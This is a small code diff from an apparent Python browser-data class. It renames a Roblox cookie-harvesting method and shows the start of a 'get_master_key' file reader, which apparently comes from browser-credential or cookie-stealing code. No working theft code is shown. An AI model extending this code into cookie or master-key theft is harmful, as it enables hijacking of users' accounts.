@@ -437,7 +437,7 @@ class Browsers:
                     except:
                         pass
                     
-        self.robloxcookies()
+        self.roblox_cookies()
 
     def get_master_key(self, path: str) -> str:
         with open(path, "r", encoding="utf-8") as f:
